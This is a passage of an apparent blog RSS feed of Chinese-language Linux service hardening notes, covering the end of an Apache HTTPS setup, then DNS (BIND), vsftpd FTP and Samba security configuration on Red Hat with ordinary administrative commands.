<p>修改主配置文件, <code>For Example:</code></p>
<div><pre><code>NameVirtualHost *:443

<span>&lt;</span>VirtualHost *:44<span><span>3</span>></span>
  <span>..</span>.
<span>&lt;</span>/VirtualHost<span>></span>
</code></pre><div aria-hidden="true"><div></div><div></div><div></div><div></div><div></div></div></div><p><img src="/assets/liunx-apache-10.png" alt="APACHE 服务安全配置"></p>
<h4 id="修改主配置文件" tabindex="-1"> 修改主配置文件</h4>
<p>打开 ssl 模块, 并引入配置文件</p>
<p>修改主配置文件, <code>For Example:</code></p>
<div><pre><code>LoadModule ssl_module /usr/lib/httpd/modules/mod_ssl.so
Include <span>"/etc/httpd/conf/httpd-ssl.conf"</span>
</code></pre><div aria-hidden="true"><div></div><div></div></div></div><p><img src="/assets/liunx-apache-11.png" alt="APACHE 服务安全配置"></p>
<p>这里提供简洁方法, 在 vi 下使用 <code>:r !find / -iname &quot;*mod_ssl.so*&quot;</code> , 在配置文件中也可以很任性的将 <code>httpd-ssl.conf</code> 里的内容填入主配置文件。</p>
<p>修改主配置文件, <code>For Example:</code></p>
<div><pre><code>LoadModule ssl_module /usr/lib/httpd/modules/mod_ssl.so
SSLCertificateFile /home/server.crt
SSLCertificateKeyFile /home/server.key
</code></pre><div aria-hidden="true"><div></div><div></div><div></div></div></div><p>以上的配置写在任何地方均生效, 但要注意的是配置中可能没有以下选项, 需要手动添加, <code>For Example:</code></p>
<div><pre><code>SSLEngine on
</code></pre><div aria-hidden="true"><div></div></div></div><p>但是最好还是写在 <code>&lt;VirtualHost *:443&gt;&lt;/VirtualHost&gt;</code> 这个地方, <code>For Example:</code></p>
<div><pre><code><span>&lt;</span>VirtualHost *:44<span><span>3</span>></span>
  LoadModule ssl_module /usr/lib/httpd/modules/mod_ssl.so
  SSLEngine on
  SSLCertificateFile /home/server.crt
  SSLCertificateKeyFile /home/server.key
<span>&lt;</span>/VirtualHost<span>></span>
</code></pre><div aria-hidden="true"><div></div><div></div><div></div><div></div><div></div><div></div></div></div><h4 id="将监听-80-端口注释" tabindex="-1"> 将监听 80 端口注释</h4>
<p>如果不注释的话, 依然还可以通过 <code>http</code> 方式访问, 注释掉, 只能使用 <code>https</code> 方式访问。</p>
<p><code>For Example:</code> <br></p>
<p><img src="/assets/liunx-apache-12.png" alt="APACHE 服务安全配置"></p>
<h3 id="访问" tabindex="-1"> 访问</h3>
<p>配置好了, 重启服务, 接下来就可以愉快的使用 <code>https</code> 来访问了。</p>
<p><code>For Example:</code> <br></p>
<p><img src="/assets/liunx-apache-13.png" alt="APACHE 服务安全配置"></p>
]]></content:encoded>
      <enclosure url="https://vxhly.github.io/assets/liunx-apache-2.png" type="image/png"/>
    </item>
    <item>
      <title>Liunx 服务配置笔记（六）DNS 服务安全配置</title>
      <link>https://vxhly.github.io/views/liunx/liunx-service-dns.html</link>
      <guid>https://vxhly.github.io/views/liunx/liunx-service-dns.html</guid>
      <source url="https://vxhly.github.io/rss.xml">Liunx 服务配置笔记（六）DNS 服务安全配置</source>
      <description>前言
这篇是 Liunx 的服务配置笔记系列第五篇, 这一篇将具体介绍 Red Hat Liunx 下 DNS 服务的安全配置。所谓 DNS 就是一个域名解析服务器, 其中 DNS 还包含正向解析和反向解析。

</description>
      <category>liunx</category>
      <pubDate>Tue, 27 Sep 2016 13:25:48 GMT</pubDate>
      <content:encoded><![CDATA[<div><p>前言</p>
<p>这篇是 Liunx 的服务配置笔记系列第五篇, 这一篇将具体介绍 Red Hat Liunx 下 DNS 服务的安全配置。所谓 DNS 就是一个域名解析服务器, 其中 DNS 还包含正向解析和反向解析。</p>
</div>

<h2 id="服务的安装" tabindex="-1"> 服务的安装</h2>
<h3 id="创建挂载目录" tabindex="-1"> 创建挂载目录</h3>
<p><code>For Example:</code></p>
<div><pre><code><span>mkdir</span> -p /mnt/cdrom
</code></pre><div aria-hidden="true"><div></div></div></div><h3 id="挂在光盘" tabindex="-1"> 挂在光盘</h3>
<p><code>For Example:</code></p>
<div><pre><code><span>mount</span> /dev/cdrom /mnt/cdrom
</code></pre><div aria-hidden="true"><div></div></div></div><h3 id="安装" tabindex="-1"> 安装</h3>
<p><code>For Example:</code></p>
<div><pre><code><span>cd</span> /mnt/cdrom/Server
<span>rpm</span> -ivh bind-9.3.6-4.P1.el5_4.2.i386.rpm
<span>rpm</span> -ivh caching-namedserver-9.3.6-4.P1.el5_4.2.i386.rpm
</code></pre><div aria-hidden="true"><div></div><div></div><div></div></div></div><p><img src="/assets/liunx-dns-1.png" alt="DNS"></p>
<h3 id="复制模板配置文件" tabindex="-1"> 复制模板配置文件</h3>
<p><code>For Example:</code></p>
<div><pre><code><span>cd</span> /etc/
<span>cp</span> -p named.caching-nameserver.conf named.conf
</code></pre><div aria-hidden="true"><div></div><div></div></div></div><p><img src="/assets/liunx-dns-2.png" alt="DNS"></p>
<p>复制的时候, 建议带上 <code>-p</code> 选项, 否则不能使用该文件, 如果忘记加上 <code>-p</code> 选项, 不要紧, 使用以下命令还可以挽救。</p>
<div><pre><code><span>chown</span> named:named named.conf
<span>chown</span> named:named named.zones
</code></pre><div aria-hidden="true"><div></div><div></div></div></div><h2 id="安全配置" tabindex="-1"> 安全配置</h2>
<h3 id="限制递归查询功能" tabindex="-1"> 限制递归查询功能</h3>
<p>默认没有这个功能, 需要手动添加。递归查询指 一般客户机和服务器之间属 递归查询 , 即当客户机向 DNS 服务器发 出请求后, 若 DNS 服务器本身不能解析, 则会向另外的 DNS 服务 器发出查询请求, 得到结果后转交给客户机。<br> 这个选项, 即可填 IP 地址, 也可以填网络段, 当然也可以填 any（所有）。</p>
<p>修改主配置文件</p>
<div><pre><code>allow-recursion <span>{</span> <span>192.168</span>.199.0/24<span>;</span><span>}</span><span>;</span>  <span># 限制网段查询</span>
allow-recursion <span>{</span> <span>192.168</span>.199.2<span>;</span><span>}</span><span>;</span>     <span># 限制 IP 查询</span>
allow-recursion <span>{</span> any<span>;</span><span>}</span><span>;</span>               <span># 所有的都可以查询</span>
</code></pre><div aria-hidden="true"><div></div><div></div><div></div></div></div><p><img src="/assets/liunx-dns-3.png" alt="DNS"></p>
<h3 id="限制查询" tabindex="-1"> 限制查询</h3>
<p><code>Default Configuration:</code></p>
<div><pre><code>allow-query <span>{</span> localhost<span>;</span><span>}</span><span>;</span>
</code></pre><div aria-hidden="true"><div></div></div></div><p>allow-query 配置项用来设置允许 DNS 查询的客户端地址, 默认的客户端地址为本机。这里可以设置为某个网段、所有、具体的某台主机三种情况。</p>
<p>修改主配置文件</p>
<div><pre><code>allow-query <span>{</span> <span>192.168</span>.199.0/24<span>;</span><span>}</span><span>;</span>  <span># 限制网段查询</span>
allow-query <span>{</span> <span>192.168</span>.199.2<span>;</span><span>}</span><span>;</span>     <span># 限制 IP 查询</span>
allow-query <span>{</span> any<span>;</span><span>}</span><span>;</span>               <span># 所有的都可以查询</span>
</code></pre><div aria-hidden="true"><div></div><div></div><div></div></div></div><p><img src="/assets/liunx-dns-4.png" alt="DNS"></p>
<h3 id="限制区传送" tabindex="-1"> 限制区传送</h3>
<p>默认没有这个功能, 需要手动添加。如果没有限制区传送, 那么 DNS 服务器允许对任何人都进行区域传输, 因此网络架构中的主机名、主机 IP 列表、路由器名和路由 IP 列表, 甚至包括各主机所在的位置和硬件配置等情况都很容易被入侵者得到在 DNS 配置文件中通过设置来限制允许区传送的主机, 从一定程度上能减轻信息泄漏。</p>
<p>修改主配置文件</p>
<div><pre><code>allow-transfer<span>{</span> <span>192.168</span>.199.0/24<span>;</span><span>}</span><span>;</span>   <span># 限制网段查询</span>
allow-transfer <span>{</span> <span>192.168</span>.199.2<span>;</span><span>}</span><span>;</span>     <span># 限制 IP 查询</span>
allow-transfer <span>{</span> any<span>;</span><span>}</span><span>;</span>               <span># 所有的都可以查询</span>
</code></pre><div aria-hidden="true"><div></div><div></div><div></div></div></div><p><img src="/assets/liunx-dns-5.png" alt="DNS"></p>
]]></content:encoded>
      <enclosure url="https://vxhly.github.io/assets/liunx-dns-1.png" type="image/png"/>
    </item>
    <item>
      <title>Liunx 服务配置笔记（三）FTP 服务安全配置</title>
      <link>https://vxhly.github.io/views/liunx/liunx-service-ftp.html</link>
      <guid>https://vxhly.github.io/views/liunx/liunx-service-ftp.html</guid>
      <source url="https://vxhly.github.io/rss.xml">Liunx 服务配置笔记（三）FTP 服务安全配置</source>
      <description>前言
本篇是 Liunx 的服务配置笔记系列第三篇, 这一篇将具体介绍 Red Hat Liunx 下 FTP 服务的安全配置。确切的说, 应该叫它 vsFTP, 就是文件的上传和下载服务, 主要的功能是在服务器与客户端之间进行文件的传输。

</description>
      <category>liunx</category>
      <pubDate>Fri, 16 Sep 2016 20:56:49 GMT</pubDate>
      <content:encoded><![CDATA[<div><p>前言</p>
<p>本篇是 Liunx 的服务配置笔记系列第三篇, 这一篇将具体介绍 Red Hat Liunx 下 FTP 服务的安全配置。确切的说, 应该叫它 vsFTP, 就是文件的上传和下载服务, 主要的功能是在服务器与客户端之间进行文件的传输。</p>
</div>

<h2 id="配置文件的位置" tabindex="-1"> 配置文件的位置</h2>
<p>主配置文件: <strong>/etc/vsftpd/vsftpd.conf</strong></p>
<h2 id="服务的启动与停止" tabindex="-1"> 服务的启动与停止</h2>
<div><p>提示</p>
<p>FTP 的服务名并不叫做 <code>vsftp</code> , 而是 <code>vsftpd</code> 。<br> 修改配置文件过后一定要重启 <code>vsftpd</code> 服务。</p>
</div>
<div><pre><code><span>service</span> vsftpd status        <span># 状态</span>
<span>service</span> vsftpd start         <span># 启动</span>
<span>service</span> vsftpd stop          <span># 暂停</span>
<span>service</span> vsftpd restart       <span># 重启</span>
</code></pre><div aria-hidden="true"><div></div><div></div><div></div><div></div></div></div><h2 id="服务的安装" tabindex="-1"> 服务的安装</h2>
<h3 id="创建挂载目录" tabindex="-1"> 创建挂载目录</h3>
<p><code>For Example:</code></p>
<div><pre><code><span>mkdir</span> -p /mnt/cdrom
</code></pre><div aria-hidden="true"><div></div></div></div><h3 id="挂载光盘" tabindex="-1"> 挂载光盘</h3>
<p><code>For Example:</code></p>
<div><pre><code><span>mount</span> /dev/cdrom /mnt/cdrom
</code></pre><div aria-hidden="true"><div></div></div></div><h3 id="安装" tabindex="-1"> 安装</h3>
<p><code>For Example:</code></p>
<div><pre><code><span>cd</span> /mnt/cdrom/Server
<span>rpm</span> -ivh vsftpd-2.0.5-16.e15i386.rpm
</code></pre><div aria-hidden="true"><div></div><div></div></div></div><p><img src="/assets/liunx-ftp-1.png" alt="FTP 安全配置"></p>
<h2 id="安全配置" tabindex="-1"> 安全配置</h2>
<h3 id="禁止匿名用户登录" tabindex="-1"> 禁止匿名用户登录</h3>
<p><code>Default Configuration:</code></p>
<div><pre><code><span>anonymous_enable</span><span>=</span>YES
</code></pre><div aria-hidden="true"><div></div></div></div><p>默认的值是允许的, 这样匿名用户就可以不需要密码就可以登录 FTP 了, 这样很不安全, 把它修改成 NO 吧。</p>
<p><img src="/assets/liunx-ftp-7.png" alt="FTP 安全配置"></p>
<h4 id="使用客户端进行验证" tabindex="-1"> 使用客户端进行验证</h4>
<p>验证之前, 请重启服务。我们就直接使用 FTP 用户登录吧。</p>
<p><code>Connection Format:</code></p>
<div><pre><code><span>ftp</span> <span>[</span>host<span>]</span>
</code></pre><div aria-hidden="true"><div></div></div></div><p>若没有成功登录, 则会显示</p>
<div><pre><code><span>530</span> Login incorrect.
</code></pre><div aria-hidden="true"><div></div></div></div><p>使用 <code>bye</code> , 可以退出 FTP, 成功则会显示</p>
<div><pre><code><span>221</span> Googbye
</code></pre><div aria-hidden="true"><div></div></div></div><p><img src="/assets/liunx-ftp-8.png" alt="FTP 安全配置"></p>
<h3 id="使用户不能登录系统-但可以登录-ftp" tabindex="-1"> 使用户不能登录系统, 但可以登录 FTP</h3>
<p>首先要创建一个普通的用户, 使他不能登录系统, 只需设置登录的 shell 就好了。</p>
<p>创建一个新用户, 别忘了设置密码, <code>For Example:</code></p>
<div><pre><code><span>useradd</span> -s /sbin/nologin <span>test</span>
<span>passwd</span> <span>test</span>
</code></pre><div aria-hidden="true"><div></div><div></div></div></div><p><code>For Example:</code> <br></p>
<p><img src="/assets/liunx-ftp-9.png" alt="FTP 安全配置"></p>
<h4 id="使用客户端进行验证-1" tabindex="-1"> 使用客户端进行验证</h4>
<p>验证之前, 请重启服务。这时候, 我们就要使用之前创建的用户进行验证了。</p>
<p>若登录成功, 则会显示</p>
<div><pre><code><span>230</span> Login successful
</code></pre><div aria-hidden="true"><div></div></div></div><p><img src="/assets/liunx-ftp-11.png" alt="FTP 安全配置"></p>
<h3 id="禁止用户写入或者上传文件" tabindex="-1"> 禁止用户写入或者上传文件</h3>
<p><code>Default Configuration:</code> <br></p>
<div><pre><code><span>write_enable</span><span>=</span>YES
</code></pre><div aria-hidden="true"><div></div></div></div><p>默认是允许用户进行上传或者写入文件, 我们可以根据需求进行修改。</p>
<p><img src="/assets/liunx-ftp-12.png" alt="FTP 安全配置"></p>
<h4 id="使用客户端进行验证-2" tabindex="-1"> 使用客户端进行验证</h4>
<p>验证之前, 请重启服务。这时候, 我们仍然使用之前创建的用户进行验证。</p>
<p>无法创建目录, 则会显示</p>
<div><pre><code><span>550</span> Permission denied
</code></pre><div aria-hidden="true"><div></div></div></div><p>尝试切换目录, 成功则会显示</p>
<div><pre><code><span>250</span> Directory successfully changed.
</code></pre><div aria-hidden="true"><div></div></div></div><p><img src="/assets/liunx-ftp-12.png" alt="FTP 安全配置"></p>
<h3 id="配置空闲会话中断时间" tabindex="-1"> 配置空闲会话中断时间</h3>
<p><code>Default Configuration:</code></p>
<div><pre><code><span>#idle_session_timeout=600</span>
</code></pre><div aria-hidden="true"><div></div></div></div><p>默认的配置时间是十分钟, （默认的单位为秒）, 我们可以根据需求进行修改。</p>
<p><img src="/assets/liunx-ftp-2.png" alt="FTP 安全配置"></p>
<h4 id="使用客户端进行验证-3" tabindex="-1"> 使用客户端进行验证</h4>
<p>验证之前, 请重启服务。成功登录之后, 我们等待一段时间, 在进行操作。</p>
<p>若超时, 则会显示</p>
<div><pre><code><span>421</span> Timeout
</code></pre><div aria-hidden="true"><div></div></div></div><p><img src="/assets/liunx-ftp-3.png" alt="FTP 安全配置"></p>
<h3 id="配置数据连接超时时间" tabindex="-1"> 配置数据连接超时时间</h3>
<p><code>Default Configuration:</code></p>
<div><pre><code><span>#data_connection_timeout=120</span>
</code></pre><div aria-hidden="true"><div></div></div></div><p>默认的配置是两分钟, （默认的单位为秒）, 我们可以根据需求进行修改。</p>
<p><img src="/assets/liunx-ftp-4.png" alt="FTP 安全配置"></p>
<h4 id="使用客户端进行验证-4" tabindex="-1"> 使用客户端进行验证</h4>
<p>此选项需要在传输数据的时候可用, 这里不再进行演示。</p>
<h3 id="限制普通用户只能在家目录中" tabindex="-1"> 限制普通用户只能在家目录中</h3>
<p><code>Default Configuration:</code></p>
<div><pre><code><span>#chroot_list_enable=YES</span>
<span>#chroot_list_file=/etc/vsftpd/chroot_list</span>
</code></pre><div aria-hidden="true"><div></div><div></div></div></div><p>默认是允许用户跳出自己的家目录的, 我们可以限制他只能在自己的家目录里。注意, 要将用户限制在家目录中, 还需要设置 'chroot_local_user=YES'。</p>
<p><img src="/assets/liunx-ftp-5.png" alt="FTP 安全配置"></p>
<p>别忘了将禁止的用户添加至 <code>/etc/vsftpd/chroot_list</code></p>
<h4 id="使用客户端进行验证-5" tabindex="-1"> 使用客户端进行验证</h4>
<p>验证之前, 请重启服务。这时候, 我们仍然使用之前创建的用户进行验证。</p>
<p>不能切换目录, 则会显示</p>
<div><pre><code><span>550</span> Failed to changed directory.
</code></pre><div aria-hidden="true"><div></div></div></div><p><img src="/assets/liunx-ftp-6.png" alt="FTP 安全配置"></p>
<h3 id="设置黑名单" tabindex="-1"> 设置黑名单</h3>
<p><code>Default Configuration:</code></p>
<div><pre><code><span>userlist_enable</span><span>=</span>YES
</code></pre><div aria-hidden="true"><div></div></div></div><p>默认情况下就是开启的, 若无开启, 我们可以根据需求进行修改。</p>
<p><img src="/assets/liunx-ftp-13.png" alt="FTP 安全配置"></p>
<p>别忘了, 将禁止的用户填入 <code>/etc/vsftpd/ftpusers</code></p>
<h4 id="使用客户端进行验证-6" tabindex="-1"> 使用客户端进行验证</h4>
<p>验证之前, 请重启服务。这时候, 我们新建一个用户, 然后将其加入黑名单, 再进行验证。</p>
<p>新建用户, <code>For Example:</code> <br></p>
<p><img src="/assets/liunx-ftp-14.png" alt="FTP 安全配置"></p>
<p>添加至黑名单, <code>For Example:</code> <br></p>
<p><img src="/assets/liunx-ftp-15.png" alt="FTP 安全配置"></p>
<p><img src="/assets/liunx-ftp-16.png" alt="FTP 安全配置"></p>
<h2 id="配置虚拟用户登录" tabindex="-1"> 配置虚拟用户登录</h2>
<h3 id="先安装-db4" tabindex="-1"> 先安装 db4</h3>
<p><code>For Example:</code></p>
<div><pre><code><span>rpm</span> -ivh db4-utils-4.3.29-10.el5.i386.rpm
</code></pre><div aria-hidden="true"><div></div></div></div><p><img src="/assets/liunx-ftp-17.png" alt="FTP 安全配置"></p>
<h3 id="生成虚拟用户口令库文件" tabindex="-1"> 生成虚拟用户口令库文件</h3>
<p><code>For Example:</code></p>
<div><pre><code><span>vim</span> /etc/vsftpd/login.txt
</code></pre><div aria-hidden="true"><div></div></div></div><p>需要注意的是, 该文件的格式如下, 单数行为用户名, 偶数行为口令。</p>
<p><img src="/assets/liunx-ftp-18.png" alt="FTP 安全配置"></p>
<h3 id="生成口令库文件-并修改其权限" tabindex="-1"> 生成口令库文件, 并修改其权限</h3>
<p><code>For Example:</code></p>
<div><pre><code>db_load -T -t <span>hash</span> -f /etc/vsftpd/login.txt /etc/vsftpd/login.db
<span>chmod</span> <span>600</span> /etc/vsftpd/login.db
</code></pre><div aria-hidden="true"><div></div><div></div></div></div><p>注意要设置权限, 只有 root 用户拥有读写权限。</p>
<p><img src="/assets/liunx-ftp-19.png" alt="FTP 安全配置"></p>
<h3 id="修改虚拟用户的-pam-文件" tabindex="-1"> 修改虚拟用户的 PAM 文件</h3>
<p><code>For Example:</code></p>
<div><pre><code><span>vim</span> /etc/pam.d/vsftpd
</code></pre><div aria-hidden="true"><div></div></div></div><p>加入如下内容, 其他的全部注释掉</p>
<div><pre><code>auth required pam_userdb.so <span>db</span><span>=</span>/etc/vsftpd/login
account required pam_userdb.so <span>db</span><span>=</span>/etc/vsftpd/login
</code></pre><div aria-hidden="true"><div></div><div></div></div></div><p><img src="/assets/liunx-ftp-20.png" alt="FTP 安全配置"></p>
<p>数据文件的地址, 记得要写对哦。</p>
<h3 id="建立虚拟用户-并设置权限" tabindex="-1"> 建立虚拟用户, 并设置权限</h3>
<p><code>For Example:</code></p>
<div><pre><code><span>useradd</span> -d /home/ftp -s /sbin/nologin virtual
<span>chmod</span> <span>777</span> /home/ftp
<span>passwd</span> virtual
</code></pre><div aria-hidden="true"><div></div><div></div><div></div></div></div><p><img src="/assets/liunx-ftp-21.png" alt="FTP 安全配置"></p>
<h4 id="修改主配置文件" tabindex="-1"> 修改主配置文件</h4>
<p>添加如下内容, <code>For Example:</code></p>
<div><pre><code><span>guest_enable</span><span>=</span>YES
<span>guest_username</span><span>=</span>virtual
<span>user_config_dir</span><span>=</span>/etc/vsftpd_user_conf
</code></pre><div aria-hidden="true"><div></div><div></div><div></div></div></div><p><img src="/assets/liunx-ftp-24.png" alt="FTP 安全配置"></p>
<h4 id="创建配置文件存放目录" tabindex="-1"> 创建配置文件存放目录</h4>
<p>此目录一定要与配置文件中的一致, <code>For Example:</code></p>
<div><pre><code><span>mkdir</span> -p /etc/vsftpd_user_conf
</code></pre><div aria-hidden="true"><div></div></div></div><h4 id="为虚拟用户创建配置文件" tabindex="-1"> 为虚拟用户创建配置文件</h4>
<p>为虚拟口令库中的每个用户分别创建一个配置文件, 配置文件中的配置于匿名用户的配置相差无几。</p>
<p>先创建配置文件, <code>For Example:</code></p>
<div><pre><code><span>vim</span> /etc/vsftpd_user_conf/ftp_test
</code></pre><div aria-hidden="true"><div></div></div></div><p>在配置文件中配置如下内容,</p>
<div><pre><code><span>anon_world_readable_only</span><span>=</span>NO               <span># 是否允许浏览 FTP 目录和下载</span>
<span>anon_upload_enable</span><span>=</span>YES                    <span># 是否允许上传</span>
<span>write_enable</span><span>=</span>YES                          <span># 是否有写权限</span>
<span>download_enable</span><span>=</span>YES                       <span># 是否允许下载文件</span>
<span>anon_mkdir_write_enable</span><span>=</span>YES               <span># 是否允许建立和删除目录</span>
<span>anon_other_write_enable</span><span>=</span>YES               <span># 是否允许改名和删除文件</span>
<span>local_root</span><span>=</span>/var/ftp/share/123
<span># 指定虚拟用户在系统用户下面的路径,限制虚拟用户的家目录,虚拟用户登录后的主目录。</span>
</code></pre><div aria-hidden="true"><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div></div></div><p><img src="/assets/liunx-ftp-25.png" alt="FTP 安全配置"></p>
<p>最后只需创建一下虚拟用户登录后的主目录, <code>For Example:</code></p>
<div><pre><code><span>mkdir</span> -p /var/ftp/share/123
</code></pre><div aria-hidden="true"><div></div></div></div><h3 id="登录测试" tabindex="-1"> 登录测试</h3>
<p>这时候就要使用虚拟用户口令库文件里的用户名和密码来登录 FTP 服务器</p>
<p><img src="/assets/liunx-ftp-23.png" alt="FTP 安全配置"></p>
]]></content:encoded>
      <enclosure url="https://vxhly.github.io/assets/liunx-ftp-1.png" type="image/png"/>
    </item>
    <item>
      <title>Liunx 服务配置笔记（五）SAMBA 服务安全配置</title>
      <link>https://vxhly.github.io/views/liunx/liunx-service-samba.html</link>
      <guid>https://vxhly.github.io/views/liunx/liunx-service-samba.html</guid>
      <source url="https://vxhly.github.io/rss.xml">Liunx 服务配置笔记（五）SAMBA 服务安全配置</source>
      <description>前言
本篇是 Liunx 的服务配置笔记系列第五篇, 这一篇将具体介绍 Red Hat Liunx 下 SAMBA 服务的安全配置。所谓 SAMBA 就是建立 Liunx 和 Windows 之间的共享, 使 Windows 能够访问 Liunx 下共享出来的文件。

</description>
      <category>liunx</category>
      <pubDate>Mon, 19 Sep 2016 19:33:21 GMT</pubDate>
      <content:encoded><![CDATA[<div><p>前言</p>
<p>本篇是 Liunx 的服务配置笔记系列第五篇, 这一篇将具体介绍 Red Hat Liunx 下 SAMBA 服务的安全配置。所谓 SAMBA 就是建立 Liunx 和 Windows 之间的共享, 使 Windows 能够访问 Liunx 下共享出来的文件。</p>
</div>

<h2 id="配置文件的位置" tabindex="-1"> 配置文件的位置</h2>
<p>主配置文件: <strong>/etc/samba/smb.conf</strong></p>
<h2 id="服务的启动与停止" tabindex="-1"> 服务的启动与停止</h2>
<div><p>提示</p>
<p>SAMBA 的服务名并不叫做 <code>samba</code> , 而是 <code>smb</code> 。<br> 修改配置文件过后一定要重启 <code>smb</code> 服务。</p>
</div>
<div><pre><code><span>service</span> smb status        <span># 状态</span>
<span>service</span> smb start         <span># 启动</span>
<span>service</span> smb stop          <span># 暂停</span>
<span>service</span> smb restart       <span># 重启</span>
</code></pre><div aria-hidden="true"><div></div><div></div><div></div><div></div></div></div><h2 id="服务的安装" tabindex="-1"> 服务的安装</h2>
<h3 id="创建挂载目录" tabindex="-1"> 创建挂载目录</h3>
<p><code>For Example:</code></p>
<div><pre><code><span>mkdir</span> -p /mnt/cdrom
</code></pre><div aria-hidden="true"><div></div></div></div><h3 id="挂在光盘" tabindex="-1"> 挂在光盘</h3>
<p><code>For Example:</code></p>
<div><pre><code><span>mount</span> /dev/cdrom /mnt/cdrom
</code></pre><div aria-hidden="true"><div></div></div></div><h3 id="安装" tabindex="-1"> 安装</h3>
<p><code>For Example:</code></p>
<div><pre><code><span>cd</span> /mnt/cdrom/Server
<span>rpm</span> -ivh perl-Convert-ASN1-0.20-1.1.noarch.rpm
<span>rpm</span> -ivh samba-3.0.33-3.28.el5.i386.rpm
</code></pre><div aria-hidden="true"><div></div><div></div><div></div></div></div><p><img src="/assets/liunx-samba-1.png" alt="SAMBA 服务安全配置"></p>
<h2 id="安全配置" tabindex="-1"> 安全配置</h2>
<h3 id="配置工作组和-netbios-名字" tabindex="-1"> 配置工作组和 NetBIOS 名字</h3>
<p><code>Default Configuration:</code></p>
<div><pre><code>workgroup <span>=</span> MYGROUP
<span>;</span>netbios name <span>=</span> MYSERVER
</code></pre><div aria-hidden="true"><div></div><div></div></div></div><div><p>提示</p>
<p>该文件默认配置的工作组是 MYGROUP, 而 Windows 下的工作组默认为 WORKGROUP, Liunx 和 Windows 的工作组一定要一样, 才能访问共享的文件。<br> 该文件默认将 NetBIOS 的名字注释掉了, NetBIOS 名字就是会在 Windows 下的网上邻居能够看到的名字, 注释掉就是会看不到, 建议去掉注释。</p>
</div>
<p><img src="/assets/liunx-samba-2.png" alt="SAMBA 服务安全配置"></p>
<h3 id="配置安全级别" tabindex="-1"> 配置安全级别</h3>
<p><code>Default Configuration:</code></p>
<div><pre><code>security <span>=</span> user
</code></pre><div aria-hidden="true"><div></div></div></div><p>默认的配置是 <code>user</code> 模式, 在该模式下, Windows 下访问 SAMBA 需要用户名和密码, 还可以设置的选项还有 <code>share/user/server/domain/ads</code> 。可以根据需求修改此选项。</p>
<ul>
<li><strong>share</strong>: 访问 Samba 服务器共享资源时不需要输入用户名和密码, 属于匿名访问。</li>
<li><strong>user</strong>: 访问 Samba 服务器共享资源时需要输入用户名和密码, 认证用户来源为 Samba 服务器本机。</li>
<li><strong>server</strong>: 访问 Samba 服务器共享资源时需要输入用户名和密码, 认证用户来源为另一台 Samba 服务器或 Windows 服务器。</li>
<li><strong>domain</strong>: Samba 服务器在一个基于 Windows NT 平台的 Windows 域中, 访问共享资源需要输入用户名和密码, 认证用户来源为 Windows 域。</li>
<li><strong>ads</strong>: Samba 服务器在一个基于 Windows 200X 平台的 Windows 活动目录中, 访问共享资源需要输入用户名和密码, 认证用户来源为 Windows 活动目录。</li>
</ul>
<h3 id="配置认证密码在传输过程中加密" tabindex="-1"> 配置认证密码在传输过程中加密</h3>
<p>在默认的配置文件中没有此选项, 可以手动添加, 正常情况下是需要开启的。</p>
<p><code>For Example:</code></p>
<div><pre><code>encrypt passwords <span>=</span> <span>yes</span>
</code></pre><div aria-hidden="true"><div></div></div></div><p><img src="/assets/liunx-samba-3.png" alt="SAMBA 服务安全配置"></p>
<h3 id="配置用户密码的存储方式" tabindex="-1"> 配置用户密码的存储方式</h3>
<p><code>Default Configuration:</code></p>
<div><pre><code>passdb backend <span>=</span> tdbsam
</code></pre><div aria-hidden="true"><div></div></div></div><div><p>提示</p>
<p>默认的配置为 <code>tdbsam</code> , 配置这个选项就是需要 <code>smbpasswd -a [userName]</code> 来建立 Samba 用户。还可以配置项为 <code>tdbsam/smbpasswd/ldapsam/mysql</code> 。可以根据需求进行修改。</p>
</div>
<ul>
<li><strong>tdbsam</strong>: 该方式使用一个数据库文件来建立用户数据库, 数据库文件名为 passdb.tdb 。可以使用 smbpasswd -a [用户名] 来建立 Samba 用户。也可以使用 pdbedit 命令来建立用户。</li>
<li><strong>smbpasswd</strong>: 该方式使用 Samba 提供的工具 smbpasswd 来给系统用户设置一个用于访问 Samba 服务的密码, 客户端就用这个密码访问 Samba 共享资源。此方式还要使用一个 smb passwd file = /usr/local/samba/etc/smbpasswd（或 /etc/samba/smbpasswd） 参数来指定保存用户名和密码的文件, 该文件需要手动建立。不推荐使用此方法。</li>
<li><strong>ldapsam</strong>: 该方式基于 LADP 的账户管理方式来验证用户, 先要建立 LDAP 服务。</li>
<li><strong>mysql</strong>: 该方式是将 Samba 服务器的用户名和密码存储到 MySQL 数据库中。</li>
</ul>
<p><img src="/assets/liunx-samba-4.png" alt="SAMBA 服务安全配置"></p>
<h3 id="设置白名单" tabindex="-1"> 设置白名单</h3>
<p><code>Default Configuration:</code></p>
<div><pre><code><span>;</span>hosts allow <span>=</span> <span>127</span><span>\</span>. <span>192.168</span>.12<span>\</span>. <span>192.168</span>.13.
</code></pre><div aria-hidden="true"><div></div></div></div><div><p>提示</p>
<p>默认的配置是将白名单进行注释掉的, 这里需要注意的是, 可以配置一个具体的 IP 地址, 也可以配置一个 IP 地址段, 在配置 IP 地址段的时候要注意最后一个 <code>.</code> 不要忘了写。如默认配置中的 <code>127.</code> 就是规定 <code>127.0.0.1 ～ 127.255.255.254</code> 这个 IP 地址段可以进行访问, 具体的 IP 地址不需要最后的 <code>.</code> .</p>
</div>
<p><code>For Example:</code> <br></p>
<p><img src="/assets/liunx-samba-5.png" alt="SAMBA 服务安全配置"></p>
<h3 id="单目录限定用户访问-禁止写入文件" tabindex="-1"> 单目录限定用户访问, 禁止写入文件</h3>
<p><code>For Example:</code></p>
<div><pre><code><span>[</span>test<span>]</span>                    <span># 共享目录的名字</span>
  comment <span>=</span> <span>test</span>          <span># 描述信息</span>
  path <span>=</span> /home/test       <span># 共享目录路径</span>
  browseable <span>=</span> <span>yes</span>        <span># 是否允许浏览</span>
  writable <span>=</span> no           <span># 是否允许用户写入或者创建文件</span>
  guest ok <span>=</span> no           <span># 是否允许 guest 用户访问</span>
  valid <span>users</span> <span>=</span> sx
  <span># 白名单,指定能够进入此资源目录的特定用户,使用逗号隔开,如果是组的话,使用 @ 指明</span>
</code></pre><div aria-hidden="true"><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div></div></div><p>另外还可以配置以下参数</p>
<ul>
<li><strong>read only</strong> =&gt; 设置是否只读, <code>yes/no</code></li>
<li><strong>public</strong> =&gt; 设置是否让所有可以登录的用户看到这个项目</li>
<li><strong>create mode</strong> =&gt; 指明新建立的文件的属性, 一般是 <code>0755</code> 。</li>
<li><strong>directory mode</strong> =&gt; 指明新建立的目录的属性, 一般是 <code>0755</code> 。</li>
</ul>
